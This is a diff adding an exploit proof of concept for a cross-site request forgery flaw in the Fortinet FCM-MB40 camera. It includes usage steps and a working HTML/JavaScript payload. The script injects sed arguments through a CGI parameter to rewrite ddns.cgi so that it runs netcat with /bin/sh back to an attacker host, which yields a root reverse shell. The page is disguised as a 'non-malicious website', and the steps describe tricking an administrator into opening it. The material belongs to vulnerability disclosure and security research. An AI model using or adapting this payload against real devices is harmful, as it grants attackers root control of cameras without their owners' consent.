@@ -1,0 +1,60 @@
+# Exploit Title: FCM-MB40 Remote Command Execution as Root via CSRF
+# Date: 2019-06-19
+# Exploit Author: @XORcat
+# Vendor Homepage: https://fortinet.com/
+# Software Link: Customer Account Required
+# Version: v1.2.0.0
+# Tested on: Linux
+# CVE : TBA
+
+<html>
+    <!-- FCM-MB40 CSRF to RCE as root, by Aaron Blair (@xorcat) 
+
+Full details: https://xor.cat/2019/06/19/fortinet-forticam-vulns/
+
+Follow the following steps to demonstrate this PoC:
+
+1. Replace IP addresses in Javascript code to repr	esent your testing
+   environment.
+2. Launch a `netcat` listener on the attacker's host using `nc -nvlp
+   1337`
+3. Ensure the "admin" user's browser is logged in to the FCM-MB40.
+   * Note: all modern browsers will cache Basic Authentication
+     credentials (such as those used by the FCM-MB40) even if the
+     FCM-MB40's administration page is closed.
+4. Open the crafted HTML document using the "admin" user's
+browser. 
+   * Note: In an attack scenario, this step would be performed by
+     implanting the code into a legitimate webpage that the "admin"
+     user visits, or by tricking the "admin" user into opening a page
+     which includes the code.
+5. Note that the `netcat` listener established in step 2. has received
+   a connection from the camera, and that it is presenting a `/bin/sh`
+   session as root.
+   * Note: type `id` in the `netcat` connection to verify this.
+
+_Note: After this issue has been exploited, the state of the system will
+have changed, and future exploitation attempts may require
+modification._
+-->
+    <head>
+        <script>
+const sleep = (milliseconds) => {
+    return new Promise(resolve => setTimeout(resolve, milliseconds))
+};
+var sed_url = 'http://192.168.1.20/cgi-bin/camctrl_save_profile.cgi?num=9&name=a%20-e%20s/^if.*/nc\\t192.168.1.10\\t1337\\t-e\\t\\/bin\\/sh\\nexit/%20../cgi-bin/ddns.cgi%20&save=profile';
+var execute_url = 'http://192.168.1.20/cgi-bin/ddns.cgi';
+
+var sed_img = document.createElement("img");
+sed_img.src = sed_url;
+
+sleep(400).then(() => {
+    var execute_img = document.createElement("img");
+    execute_img.src = execute_url;
+});
+        </script>
+    </head>
+    <body>
+        <h1>Welcome to my non-malicious website.</h1>
+    </body>
+</html>
